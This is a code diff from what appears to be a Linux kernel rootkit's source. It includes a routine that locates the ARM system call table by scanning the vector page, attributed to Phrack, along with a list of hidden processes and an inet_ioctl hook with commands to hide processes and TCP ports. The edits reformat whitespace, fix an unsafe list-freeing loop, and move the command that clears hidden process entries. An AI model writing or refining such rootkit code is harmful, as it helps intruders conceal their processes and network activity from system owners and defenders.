@@ -184,20 +184,20 @@ unsigned long *find_ia32_sys_call_table ( void )
 // Phrack #68 0x06; dong-hoon you
 unsigned long *find_sys_call_table ( void )
 {
-	void *swi_addr = (long *)0xffff0008;
-	unsigned long offset, *vector_swi_addr;
+    void *swi_addr = (long *)0xffff0008;
+    unsigned long offset, *vector_swi_addr;
 
-	offset = ((*(long *)swi_addr) & 0xfff) + 8;
-	vector_swi_addr = *(unsigned long **)(swi_addr + offset);
+    offset = ((*(long *)swi_addr) & 0xfff) + 8;
+    vector_swi_addr = *(unsigned long **)(swi_addr + offset);
 
-	while ( vector_swi_addr++ )
-		if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
+    while ( vector_swi_addr++ )
+        if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
         {
-			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
-			return vector_swi_addr + offset;
-		}
+            offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
+            return vector_swi_addr + offset;
+        }
 
-	return NULL;
+    return NULL;
 }
 #endif
 
@@ -435,12 +435,11 @@ void unhide_proc ( unsigned short pid )
 
 void clean_hide_proc(void)
 {
-    struct hidden_proc *hp;
-
-    list_for_each_entry(hp, &hidden_procs, list)
+    struct hidden_proc *hp, *q;
+    list_for_each_entry_safe ( hp, q, &hidden_procs, list)
     {
-	list_del(&hp->list);
-	kfree(hp);
+        list_del(&hp->list);
+        kfree(hp);
     }
 }
 
@@ -737,6 +736,22 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                 }
                 break;
 
+            case 18:
+                {
+
+                    struct s_proc_args proc_args;
+
+                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
+                    if ( ret )
+                        return 0;
+
+                    DEBUG("Clean Hiddden PID\n");
+
+                    clean_hide_proc();
+
+                }
+                break;
+
             /* Hide TCPv4 port */
             case 3:
                 {
@@ -981,23 +996,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
                 break;
 
-            case 18:
-                {
-
-                    struct s_proc_args proc_args;
-
-                    ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
-                    if ( ret )
-                        return 0;
-
-                    DEBUG("Clean Hiddden PID\n");
-
-                    clean_hide_proc();
-		
-                }
-		break;
-            
-	    default:
+        default:
                 break;
         }
 
